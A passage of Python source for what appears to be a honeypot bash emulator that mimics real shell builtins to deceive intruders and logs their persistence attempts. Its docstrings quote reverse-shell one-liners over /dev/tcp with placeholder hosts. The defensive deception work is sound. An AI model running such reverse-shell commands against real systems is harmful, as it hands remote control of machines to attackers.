                    hit = (fnmatch.fnmatch(name.lower(), seg.lower())
                           if shopts.get("nocaseglob")
                           else fnmatch.fnmatchcase(name, seg))
                    if hit:
                        nxt.append((d.rstrip("/") + "/" + name) if d != "/"
                                   else "/" + name)
            cur = nxt
            if not cur:
                return self._glob_nomatch(word, shopts)
        if not cur:
            return self._glob_nomatch(word, shopts)
        if word.endswith("/"):
            # `*/` matches directories only, which is how `ls -d */` lists
            # just the subdirectories.
            cur = [c for c in cur if self.fs.isdir(c)]
        if absolute:
            return [c + "/" for c in cur] if word.endswith("/") else cur
        # Relative patterns expand to relative paths, as bash does.
        pref = self.cwd.rstrip("/") + "/"
        return [p[len(pref):] if p.startswith(pref) else p for p in cur]

    def _glob_nomatch(self, word, shopts):
        """What a pattern that matched nothing expands to.

        bash leaves it alone -- unless nullglob (expands to nothing) or
        failglob (the command does not run at all) is set. Both were
        accepted by shopt and ignored."""
        if shopts.get("failglob"):
            self.err("bash: no match: %s" % word)
            self._expand_fatal = True
            return []
        if shopts.get("nullglob"):
            return []
        return [word]

    def _globstar(self, word):
        """`**` expansion: match across directory boundaries.

        Only reached with `shopt -s globstar`, which is how a script asks
        for `/var/www/**/*.php`."""
        import fnmatch
        absolute = word.startswith("/")
        base = "/" if absolute else self.cwd
        rx = []
        for seg in [p for p in word.strip("/").split("/") if p]:
            if seg == "**":
                rx.append(r"(?:[^/]+/)*")
            else:
                rx.append(fnmatch.translate(seg).replace(r"(?s:", "(?:")
                          .replace(r"\Z", "") + "/")
        pattern = re.compile("^" + "".join(rx).rstrip("/") + "$")
        pre = base.rstrip("/") + "/"
        hits = []
        for k in sorted(self.fs.nodes, key=lambda n: (_collate(n), n)):
            if not k.startswith(pre) and base != "/":
                continue
            rel = k[len(pre):] if k.startswith(pre) else k.lstrip("/")
            if not rel:
                continue
            # A dot component is hidden at any depth, not just the first:
            # `**/*.txt` was matching .hidden.txt with dotglob off.
            if (not getattr(self, "_shopts", {}).get("dotglob")
                    and any(part.startswith(".") for part in rel.split("/"))):
                continue
            if pattern.match(rel):
                hits.append(k if absolute else rel)
        if not hits:
            return self._glob_nomatch(word, getattr(self, "_shopts", {}))
        return hits

    _EXEC_REDIR = re.compile(r"^(\d*)(<>|>>|>&|<&|>|<)(.*)$")

    def _bash_interactive(self):
        """`bash -i` under a pipe. It was answering "-i: No such file or
        directory", so the commonest reverse-shell one-liner --
        `bash -i >& /dev/tcp/h/p 0>&1` -- failed on the shell rather than
        on the socket, which tells the actor more than the socket would."""
        self.err("bash: cannot set terminal process group (%d): "
                 "Inappropriate ioctl for device" % self.shell_pid)
        self.err("bash: no job control in this shell")
        return "", 0

    def cmd_exec(self, a, stdin=""):
        """Real exec replaces the shell image. We cannot, but running the
        command is indistinguishable for anything short of checking $$.

        `exec 3<>/dev/tcp/host/port` is the bash reverse shell, and the
        redirection was being passed to dispatch as a command name -- so
        the box answered "bash: 3: command not found", which no shell has
        ever said, and the C2 address went unrecorded.
        """
        rest = []
        before = dict(self.fds)
        for w in a:
            # The outer redirect scanner consumes `>file` and leaves the fd
            # digit behind as a word. It is a file descriptor, not a
            # command: dispatching it printed "bash: 3: command not found",
            # which no shell says.
            if w.isdigit() and not rest:
                continue
            m = self._EXEC_REDIR.match(w)
            if m and (m.group(1) or m.group(2) in ("<>", ">&", "<&")) \
                    and not rest:
                fd = int(m.group(1) or (1 if ">" in m.group(2) else 0))
                op, tgt = m.group(2), m.group(3).strip()
                if tgt == "-":
                    self.fds.pop(fd, None)
                    continue
                if op in (">&", "<&") and tgt.isdigit():
                    src = self.fds.get(int(tgt))
                    if src is not None:
                        self.fds[fd] = src
                    continue
                if not tgt:
                    continue
                path = VFS.norm(self.expand(tgt), self.cwd)
                special = self._redirect_open(path, tgt)
                if special is not None:
                    return "", special
                if op in (">", "<>"):
                    self.fs.write(path, b"", mode=self._new_mode())
                self.fds[fd] = path
                continue
            rest.append(w)
        # /proc has to learn about it too, or `exec 7<f` moves the shell's
        # table and leaves `ls /proc/$$/fd` showing 0 1 2.
        if not rest or dict(self.fds) != before:
            self._resync_proc()
        if not rest:
            return "", 0
        return self.dispatch(rest[0], rest[1:], stdin)

    def cmd_source(self, a, stdin=""):
        if not a:
            self.err("bash: source: filename argument required")
            self.err("source: usage: source filename [arguments]")
            return "", 2
        p = VFS.norm(a[0], self.cwd)
        data = self.fs.read(p)
        if data is None:
            # bash blames the line, not the builtin: "bash: line 1: ./x: No
            # such file or directory". We printed "bash: source: ./x: ...",
            # which no bash produces.
            self.err("bash: %s%s: No such file or directory"
                     % (self.where(), a[0]))
            return "", 1
        body = data.decode("latin-1")
        # A sourced file runs in the *current* shell, so `exit` inside it
        # ends the caller -- exactly the rule a { ... } group already
        # follows, and the reason _group_depth exists. Without it the nested
        # run restored the outer _exiting on the way out, so
        # `. ./setup.sh` where setup.sh ends in `exit 1` carried straight on
        # to the next command. A real bash stops there, session and all,
        # which means we ran commands the box never would have reached.
        # `. f a b` sets the positional parameters for the duration of the
        # file and restores them after; $0 is left alone. They were not set
        # at all, so a sourced stager saw $# of 0 and took its no-argument
        # branch.
        saved_params = list(self.params)
        if len(a) > 1:
            self.params = list(a[1:])
        self._group_depth += 1
        try:
            out = self.run("\n".join(l for l in body.splitlines()
                                      if not l.startswith("#!")))
        finally:
            self._group_depth -= 1
            self.params = saved_params
            rc = self.last_rc
            # `return` ends the sourced file, not the shell that sourced it
            # -- the same rule a function body follows. `exit` does end the
            # shell, which is what the _group_depth above is for. Letting
            # both through stopped the caller dead on a `return`.
            self._ret = False
        return out, rc

    def cmd_let(self, a, stdin=""):
        if not a:
            self.err("bash: let: expression expected")
            return "", 1
        last = 0
        for expr in a:
            if "=" in expr and not re.search(r"[=!<>]=", expr):
                nm, _, val = expr.partition("=")
                last = arith_eval(val, self._gv())
                self.vars[nm.strip()] = str(last)
            else:
                last = arith_eval(expr, self._gv())
        return "", 0 if last else 1

    def var_attrs(self, name):
        """The letters bash prints between `declare` and the name.

        `declare -p PATH` said "declare -- PATH=..." for a variable that is
        exported, and `declare -x` with no operands printed every shell
        variable rather than the exported ones -- so `export -p` and
        `declare -x`, which are the same command in bash, gave 18 lines and
        33. Nothing tracked an attribute; there is one answer now and every
        spelling reads it.
        """
        # bash prints them in the order i, r, x -- `declare -rx` for an
        # exported readonly, `declare -ir` for a readonly integer --
        # measured, because the obvious guess is alphabetical and it is not.
        out = ""
        if name in getattr(self, "_int_vars", ()):
            out += "i"
        if name in self.readonly_vars:
            out += "r"
        if name in self.exported:
            out += "x"
        return out or "-"

    def _declare_line(self, name):
        attrs = self.var_attrs(name)
        return "declare -%s %s=\"%s\"\n" % (
            attrs if attrs != "-" else "-", name, self.vars.get(name, ""))

    def cmd_declare(self, a, stdin=""):
        flags = [x for x in a if x.startswith("-")]
        rest = [x for x in a if not x.startswith("-")]
        if "-f" in flags or "-F" in flags:
            names = rest or sorted(self.funcs)
            out, rc = [], 0
            for n in names:
                if n not in self.funcs:
                    rc = 1
                    continue
                if "-F" in flags:
                    out.append("declare -f %s\n" % n)
                    continue
                # It printed "..." for the body, so `declare -f f` proved the
                # function was never really stored.
                body = self.funcs[n].strip()
                indented = "\n".join("    " + ln for ln in body.splitlines())
                out.append("%s () \n{ \n%s\n}\n" % (n, indented))
            return "".join(out), rc
        # -x, -r and -i with no operands are filters, not decoration.
        want = "".join(c for f in flags for c in f[1:] if c in "xri")
        if not rest:
            names = sorted(self.vars)
            if want:
                names = [k for k in names
                         if all(c in self.var_attrs(k) for c in want)]
            return "".join(self._declare_line(k) for k in names), 0
        integer = "-i" in flags
        out = []
        for item in rest:
            if "=" in item:
                k, v = item.split("=", 1)
                val = self.expand(v)
                if integer or k in getattr(self, "_int_vars", ()):
                    # `declare -i n=5; n=n+1` has to evaluate; it used to store
                    # the literal string "n+1".
                    val = str(self._arith(val))
                if k in self.readonly_vars:
                    self.err("bash: %s%s: readonly variable"
                             % (self.where(), k))
                    return "", 1
                self.vars[k] = val
                if integer:
                    if not hasattr(self, "_int_vars"):
                        self._int_vars = set()
                    self._int_vars.add(k)
                if "-r" in flags:
                    self.readonly_vars.add(k)
                if "-x" in flags:
                    self.exported.add(k)
            elif "-p" in flags:
                if item in self.vars:
                    out.append(self._declare_line(item))
                else:
                    self.err("bash: declare: %s: not found" % item)
                    return "", 1
            elif want:
                # `declare -x NAME` with no value sets the attribute.
                if "x" in want:
                    self.exported.add(item)
                if "r" in want:
                    self.readonly_vars.add(item)
                if "i" in want:
                    if not hasattr(self, "_int_vars"):
                        self._int_vars = set()
                    self._int_vars.add(item)
        return "".join(out), 0

    cmd_typeset = cmd_declare

    def cmd_readonly(self, a, stdin=""):
        """`readonly` was an alias for `export`.

        So `readonly RO=1` put RO in the environment -- `env | grep RO`
        found it, and the guest's does not -- `readonly -p` printed
        "declare -x RO" where bash prints "declare -r RO", and the one
        thing the attribute is for did not happen: `RO=2` succeeded and
        changed the value. A variable a script marks readonly and then
        checks is a variable an attacker can use to tell a shell apart
        from a shell.
        """
        flags = [x for x in a if x.startswith("-")]
        rest = [x for x in a if not x.startswith("-")]
        if not rest or "-p" in flags:
            return "".join("declare -r %s=\"%s\"\n" % (k, self.vars.get(k, ""))
                           for k in sorted(self.readonly_vars)
                           if k in self.vars), 0
        for item in rest:
            k, eq, v = item.partition("=")
            k = k.strip()
            if not k:
                continue
            if eq:
                if k in self.readonly_vars:
                    self.err("bash: %s%s: readonly variable"
                             % (self.where(), k))
                    return "", 1
                self.vars[k] = self.expand(v)
            self.readonly_vars.add(k)
        return "", 0

    # NOTE: this shadowed the real implementation above -- Python keeps the
    # last definition -- so `local` was an alias for `export` and leaked into
    # the caller's scope. Kept as an alias to the real one rather than deleted,
    # so a future duplicate is obvious.
    _SIGNALS = ("HUP", "INT", "QUIT", "ILL", "TRAP", "ABRT", "BUS", "FPE", "KILL",
                "USR1", "SEGV", "USR2", "PIPE", "ALRM", "TERM", "STKFLT", "CHLD",
                "CONT", "STOP", "TSTP", "TTIN", "TTOU", "URG", "XCPU", "XFSZ",
                "VTALRM", "PROF", "WINCH", "IO", "PWR", "SYS")

    def cmd_trap(self, a, stdin=""):
        if a and a[0] == "-l":
            # trap -l and kill -l are the same list in bash. They were two
            # separate loops here and produced different trailing
            # whitespace for the same 31 signals.
            return self._siglist(), 0
        if not a or a[0] == "-p":
            return "".join("trap -- '%s' %s\n" % (v, k)
                           for k, v in sorted(self.traps.items())), 0
        action, sigs = a[0], a[1:]
        for s in sigs:
            key = s.upper().replace("SIG", "")
            if action in ("-", ""):
                self.traps.pop(key, None)
            else:
                self.traps[key] = action
        return "", 0

    def cmd_hash(self, a, stdin=""):
        if a and a[0] in ("-r", "-d"):
            return "", 0
        # -t prints the path for each name instead of remembering it. It
        # was unhandled, so `hash -t ls` looked up a command called "-t".
        if a and a[0] == "-t":
            out, rc = [], 0
            for nm in a[1:]:
                w, r = self.cmd_which([nm], stdin)
                if r:
                    self.err("bash: hash: %s: not found" % nm)
                    rc = 1
                else:
                    out.append(w)
            return "".join(out), rc
        if a:
            for nm in a:
                _, rc = self.cmd_which([nm], stdin)
                if rc:
                    self.err("bash: hash: %s: not found" % nm)
                    return "", 1
            return "", 0
        return "hash: hash table empty\n", 0

    def cmd_umask(self, a, stdin=""):
        vals = [x for x in a if not x.startswith("-")]
        if not vals:
            if a and a[0] == "-S":
                return "u=rwx,g=rx,o=rx\n", 0
            return "%04o\n" % self.umask, 0
        try:
            self.umask = int(vals[0], 8)
        except ValueError:
            self.err("bash: umask: %s: invalid symbolic mode operator" % vals[0])
            return "", 1
        return "", 0

    def cmd_alias(self, a, stdin=""):
        if not a:
            return "".join("alias %s='%s'\n" % (k, v)
                           for k, v in sorted(self.aliases.items())), 0
        out, rc = [], 0
        for item in a:
            if "=" in item:
                k, v = item.split("=", 1)
                self.aliases[k] = v.strip("'\"")
            elif item in self.aliases:
                out.append("alias %s='%s'\n" % (item, self.aliases[item]))
            else:
                self.err("bash: alias: %s: not found" % item)
                rc = 1
        return "".join(out), rc

    def cmd_unalias(self, a, stdin=""):
        if a and a[0] == "-a":
            self.aliases.clear()
            return "", 0
        for item in a:
            if self.aliases.pop(item, None) is None:
                self.err("bash: unalias: %s: not found" % item)
                return "", 1
        return "", 0

    # No job control in a non-interactive shell, which is what an exec channel
    # is -- bash says exactly this and returns 1.
    def cmd_disown(self, a, stdin=""):
        """Drop a job from the table, which is what disown is for."""
        if "-a" in a:
            self.jobs = []
            return "", 0
        if not a:
            # Bare disown drops the *current* job, not every job. Clearing
            # the table meant one `disown` orphaned every background job
            # the session had, so `jobs` went empty while the processes
            # were still in ps -- and disown -a, which really does mean
            # all, became indistinguishable from it.
            j = self._job_by_spec("%+")
            if j is not None and j in self.jobs:
                self.jobs.remove(j)
            return "", 0
        for spec in a:
            if spec.startswith("%"):
                j = self._job_by_spec(spec)
                if j is not None and j in self.jobs:
                    self.jobs.remove(j)
        return "", 0

    def cmd_bg(self, a, stdin=""):
        self.err("bash: bg: no job control")
        return "", 1

    def cmd_fg(self, a, stdin=""):
        self.err("bash: fg: no job control")
        return "", 1

    def cmd_times(self, a, stdin=""):
        return "0m0.012s 0m0.004s\n0m0.000s 0m0.000s\n", 0

    def cmd_getopts(self, a, stdin=""):
        return "", 1

    def cmd_caller(self, a, stdin=""):
        return "", 1

    def cmd_suspend(self, a, stdin=""):
        self.err("bash: suspend: cannot suspend a login shell")
        return "", 1

    def cmd_fc(self, a, stdin=""):
        """`fc -l` is the other spelling of `history`, and it did not exist
        at all -- while `type fc` called it a shell builtin. Same list
        history prints, so the two cannot disagree."""
        if self.exec_mode:
            return "", 0
        body, _rc = self.cmd_history([])
        rows = [ln.strip().split("  ", 1) for ln in body.splitlines()]
        rows = [(r[0], r[1]) for r in rows if len(r) == 2]
        nums = [int(x) for x in a if x.lstrip("-").isdigit()]
        if nums:
            lo = nums[0] if nums[0] > 0 else len(rows) + nums[0] + 1
            hi = nums[1] if len(nums) > 1 else len(rows)
            rows = [r for r in rows if lo <= int(r[0]) <= hi]
        else:
            rows = rows[-16:]
        if "-s" in a:
            return self.run(rows[-1][1] if rows else ""), 0
        return "".join("%5s\t%s\n" % (n, c) for n, c in rows), 0

    def cmd_dirs(self, a, stdin=""):
        stack = [self.cwd] + list(self._dirstack)
        if "-v" in a:
            return "".join("%2d  %s\n" % (i, d)
                           for i, d in enumerate(stack)), 0
        if "-c" in a:
            self._dirstack = []
            return "", 0
        return " ".join(stack) + "\n", 0

    def cmd_pushd(self, a, stdin=""):
        """Directory stack. `type pushd` called it a builtin and running it
        answered command not found."""
        targets = [x for x in a if not x.startswith("-")]
        if not targets:
            if not self._dirstack:
                self.err("bash: pushd: no other directory")
                return "", 1
            top = self._dirstack.pop(0)
            here = self.cwd
            self.cmd_cd([top])
            self._dirstack.insert(0, here)
            return self.cmd_dirs([])[0], 0
        dest = VFS.norm(targets[0], self.cwd)
        if not self.fs.isdir(dest):
            self.err("bash: pushd: %s: No such file or directory"
                     % targets[0])
            return "", 1
        self._dirstack.insert(0, self.cwd)
        self.cmd_cd([targets[0]])
        return self.cmd_dirs([])[0], 0

    def cmd_popd(self, a, stdin=""):
        if not self._dirstack:
            self.err("bash: popd: directory stack empty")
            return "", 1
        self.cmd_cd([self._dirstack.pop(0)])
        return self.cmd_dirs([])[0], 0

    def cmd_mapfile(self, a, stdin=""):
        """Read lines into an array. `mapfile -t arr < file` is how a
        script slurps a list; it answered command not found."""
        strip = "-t" in a
        names = [x for x in a if not x.startswith("-")]
        name = names[0] if names else "MAPFILE"
        lines = stdin.splitlines() if strip else \
            [l + "\n" for l in stdin.splitlines()]
        self.arrays[name] = lines
        self.vars[name] = lines[0] if lines else ""
        return "", 0

    cmd_readarray = cmd_mapfile

    def cmd_bind(self, a, stdin=""):
        # readline bindings. Nothing to show in a shell with no readline,
        # and bash itself exits 0 for the query forms.
        return "", 0

    def cmd_complete(self, a, stdin=""):
        return "", 0

    def cmd_compopt(self, a, stdin=""):
        return "", 0

    # bash reads these at startup, in this order. A login shell takes
    # /etc/profile and then the first personal profile that exists; an
    # interactive non-login shell takes ~/.bashrc. Debian's own ~/.profile
    # sources ~/.bashrc, so on this box a login session runs both.
    _PROFILE_CANDIDATES = (".bash_profile", ".bash_login", ".profile")

    def run_startup_files(self, login=True):
        """Source the files bash sources when a session starts.

        Nothing sourced them. An attacker who appended a line to
        ~/.bashrc -- which is persistence you can write with one `echo`,
        and one of the most common things done to a box after a login --
        saw it never run, on a machine that would have run it on every
        shell since. /etc/profile.d/*.sh, the system-wide version of the
        same trick, was equally inert -- it is sourced by /etc/profile's own
        run-parts loop now that that file is the real one.

        Anything they added is executed the way bash would execute it, and
        the addition is logged: a startup file that no longer matches the
        image it shipped with is persistence, whatever it contains.
        """
        if getattr(self, "_startup_done", False):
            return ""
        self._startup_done = True
        home = self.vars.get("HOME") or self.cwd
        files = []
        if login:
            files.append("/etc/profile")
            # /etc/profile.d is NOT listed here. The real /etc/profile ends
            # with a run-parts loop that sources it, so naming the directory
            # again sourced everything in it twice -- and in the wrong order,
            # before /etc/profile's own body rather than after it. This loop
            # was correct while /etc/profile was a sketch that never sourced
            # anything; the moment the real file went in, one job had two
            # mechanisms. The file is the source of truth now.
            for cand in self._PROFILE_CANDIDATES:
                if self.fs.exists(home + "/" + cand):
                    files.append(home + "/" + cand)
                    break
        else:
            files.append(home + "/.bashrc")
        # Check every startup file the image shipped, not just the ones
        # this shell is about to source: ~/.bashrc is read by ~/.profile
        # through a plain `.`, so a change there was invisible to a check
        # that only looked at what run_startup_files opened directly.
        self._flag_startup_changes()
        out = []
        for path in files:
            out.append(self._source_startup(path))
        return "".join(out)

    def _flag_startup_changes(self):
        base = getattr(self.fs, "startup_baseline", None) or {}
        # A file that was not in the image at all is the other half of this:
        # dropping a new /etc/profile.d/*.sh, or a ~/.bash_profile that
        # takes precedence over the ~/.profile already there, is persistence
        # without editing anything.
        fresh = []
        try:
            for nm in sorted(self.fs.listdir("/etc/profile.d") or []):
                if nm.endswith(".sh") and "/etc/profile.d/" + nm not in base:
                    fresh.append("/etc/profile.d/" + nm)
        except Exception:                                     # noqa: BLE001
            pass
        home = self.vars.get("HOME") or self.cwd
        for cand in (".bash_profile", ".bash_login", ".bash_logout"):
            path = home + "/" + cand
            if path not in base and self.fs.exists(path):
                fresh.append(path)
        for path in fresh:
            try:
                body = (self.rawfs.read(path) or b"").decode("latin-1")
            except Exception:                                 # noqa: BLE001
                body = ""
            self.log(event="persistence", kind="startup_file_added",
                     path=path, added=body[:400], user=self.user)
        for path, was in sorted(base.items()):
            try:
                now = (self.rawfs.read(path) or b"").decode("latin-1")
            except Exception:                                 # noqa: BLE001
                continue
            if now == was:
                continue
            added = [l for l in now.splitlines()
                     if l not in was.splitlines()]
            self.log(event="persistence", kind="startup_file", path=path,
                     added="\n".join(added)[:400] or "(file emptied)",
                     user=self.user)

    def _source_startup(self, path):
        body = None
        try:
            body = self.fs.read(path)
        except Exception:                                     # noqa: BLE001
            body = None
        if not body:
            return ""
        text = body.decode("latin-1")
        # Bounded: a startup file is a handful of lines on any real box,
        # and this one runs before the attacker has typed anything.
        lines = text.splitlines()[:200]
        try:
            return self.run("\n".join(lines))
        except Exception:                                     # noqa: BLE001
            return ""

    def cmd_shopt(self, a, stdin=""):
        """Shell options, and the five of them that change globbing.

        -s and -u returned 0 for any name at all and recorded nothing, so
        `shopt -s globstar` succeeded and `shopt globstar` immediately
        afterwards answered "invalid shell option name" -- and `**` went on
        behaving like `*`. The table was 13 of bash's 55 options, so most
        real names were rejected outright.
        """
        opts = self._shopts
        setting = "-s" if "-s" in a else ("-u" if "-u" in a else None)
        quiet = "-q" in a
        printing = "-p" in a
        names = [x for x in a if not x.startswith("-")]
        bad = [nm for nm in names if nm not in opts]
        if bad:
            self.err("bash: shopt: %s: invalid shell option name" % bad[0])
            return "", 1
        if setting:
            for nm in names:
                opts[nm] = (setting == "-s")
            return "", 0
        if quiet:
            return "", (0 if all(opts[nm] for nm in names) else 1)
        chosen = names or sorted(opts)
        if printing:
            return "".join("shopt -%s %s\n" % ("s" if opts[nm] else "u", nm)
                           for nm in chosen), 0
        out = "".join("%-16s%s\n" % (nm, "on" if opts[nm] else "off")
                      for nm in chosen)
        return out, (0 if all(opts[nm] for nm in chosen) else 1)

    def cmd_builtin(self, a, stdin=""):
        if not a:
            return "", 0
        return self.dispatch(a[0], a[1:], stdin)

    def cmd_enable(self, a, stdin=""):
        if a and a[0] in ("-n", "-a"):
            return "", 0
        return "".join("enable %s\n" % n for n in sorted(self._BUILTINS)), 0

    def cmd_compgen(self, a, stdin=""):
        if a and a[0] == "-b":
            return "".join(n + "\n" for n in sorted(self._BUILTINS)), 0
        if a and a[0] in ("-c", "-a", "-A"):
            names = set(self._BUILTINS)
            for path in self.fs.nodes:
                d, _, nm = path.rpartition("/")
                if d in ("/bin", "/sbin", "/usr/bin", "/usr/sbin",
                         "/usr/local/bin", "/usr/local/sbin"):
                    names.add(nm)
            return "".join(n + "\n" for n in sorted(names)), 0
        return "", 1

    def cmd_wait(self, a, stdin=""):
        return "", 0

    def cmd_file(self, a, stdin=""):
        out = []
        for f in [x for x in a if not x.startswith("-")]:
            path = VFS.norm(f, self.cwd)
            node = (self.fs.nodes.get(path)
                    or self.fs.nodes.get(self.fs.resolve(path)))
            if node is None:
                out.append("%s: cannot open `%s' (No such file or directory)\n" % (f, f))
                continue
            if node.is_dir:
                out.append("%s: directory\n" % f)
                continue
            if node.blob and not node.blob[0].startswith("hostfile:"):
                # Answer from the declared kind instead of reading: this
                # would otherwise synthesise 11MB of kernel to look at six
                # magic bytes, for the same reason the ELF branch below
                # avoids it. `file /boot/vmlinuz-*` said "data".
                #
                # A hostfile blob is exempt: those are real captured bytes
                # sitting on disk, so reading the first few is cheap and
                # gives the true answer. Taking the table's default called
                # a downloaded ELF "data" while the same bytes written any
                # other way were identified properly.
                out.append("%s: %s\n" % (f, _BLOB_FILE_DESC.get(
                    node.blob[0], "data")))
                continue
            # ELF bodies are synthesised on read, so node.content is empty
            # for every stock binary -- `file /bin/ls` said "empty".
            body = self.fs.read(path) or b""
            if node.link is not None:
                out.append("%s: symbolic link to %s\n" % (f, node.link))
                continue
            if node.chardev is not None:
                out.append("%s: character special (%d/%d)\n"
                           % (f, node.chardev[0], node.chardev[1]))
                continue
            if node.sock:
                out.append("%s: socket\n" % f)
                continue
            if getattr(node, "fifo", False):
                out.append("%s: fifo (named pipe)\n" % f)
                continue
            if node.blockdev is not None:
                # `file /dev/sda` said "empty" -- the one answer that says
                # the disk is not a disk.
                out.append("%s: block special (%d/%d)\n"
                           % (f, node.blockdev[0], node.blockdev[1]))
                continue
            if len(body) > 262 and body[257:262] in (b"ustar",):
                # A tar was reported as "ASCII text": the member names are
                # text and nothing looked for the magic 257 bytes in.
                kind = ("POSIX tar archive (GNU)"
                        if body[257:265] == b"ustar  \x00"
                        else "POSIX tar archive")
                out.append("%s: %s\n" % (f, kind))
            elif body.startswith(b"\x1f\x8b"):
                # The box has gzipped rotated logs now; `file` calling them
                # "data" is the same miss as the kernel image was.
                # The uncompressed size was guessed as 3.5x the compressed
                # size, so `file` said 567 for an archive `zcat | wc -c`
                # measured at 10240. gzip stores it in the last four bytes;
                # that is where file reads it and now so do we.
                isize = (int.from_bytes(body[-4:], "little")
                         if len(body) >= 18 else 0)
                # gzip records the original name and mtime in its header;
                # file prints both, and we printed neither.
                extra = ""
                if len(body) > 10:
                    flg = body[3]
                    mt = int.from_bytes(body[4:8], "little")
                    off = 10
                    if flg & 0x04 and len(body) > off + 2:
                        off += 2 + int.from_bytes(body[off:off + 2], "little")
                    if flg & 0x08:
                        end = body.find(b"\x00", off)
                        if end > off:
                            extra += ', was "%s"' % body[off:end].decode(
                                "latin-1")
                    if mt:
                        extra += (", last modified: %s"
                                  % time.strftime("%a %b %e %H:%M:%S %Y",
                                                  time.gmtime(mt)))
                out.append("%s: gzip compressed data%s, from Unix, "
                           "original size modulo 2^32 %d\n" % (f, extra, isize))
            elif body.startswith(b"\x7fELF"):
                out.append("%s: ELF 64-bit LSB pie executable, x86-64, version 1 "
                           "(SYSV), dynamically linked, interpreter "
                           "/lib64/ld-linux-x86-64.so.2, BuildID[sha1]=%s, "
                           "for GNU/Linux 3.2.0, stripped\n"
                           % (f, hashlib.sha1(body[:64]).hexdigest()[:40]))
            elif body.startswith(b"#!"):
                first = body.split(b"\n", 1)[0].decode("utf-8", "replace")
                interp = first[2:].strip().split()[0] if len(first) > 2 else "sh"
                kind = "POSIX shell script" if "sh" in interp else "script"
                out.append("%s: %s, ASCII text executable\n" % (f, kind))
            elif not body:
                out.append("%s: empty\n" % f)
            else:
                try:
                    body.decode("utf-8")
                    out.append("%s: ASCII text\n" % f)
                except UnicodeDecodeError:
                    out.append("%s: data\n" % f)
        return "".join(out), 0

    def cmd_true(self, a, stdin=""):
        return "", 0

    def cmd_false(self, a, stdin=""):
        return "", 1

    def cmd_basename(self, a, stdin=""):
        if not a:
            return "", 1
        b = a[0].rstrip("/").split("/")[-1]
        if len(a) > 1 and b.endswith(a[1]):
            b = b[:-len(a[1])]
        return b + "\n", 0

    def cmd_dirname(self, a, stdin=""):
        args = [x for x in a if not x.startswith("-")]
        if not args:
            self.err("dirname: missing operand")
            return "", 1
        out = []
        for one in args:
            d = one.rstrip("/")
            if not d:                       # `dirname /` is "/", not "."
                out.append("/\n")
                continue
            d = d.rsplit("/", 1)[0] if "/" in d else "."
            out.append((d or "/") + "\n")
        return "".join(out), 0

    def cmd_exit(self, a, stdin=""):
        self._exiting = True
        try:
            return "", int(a[0]) if a else 0
        except (ValueError, IndexError):
            return "", 0
    cmd_logout = cmd_exit


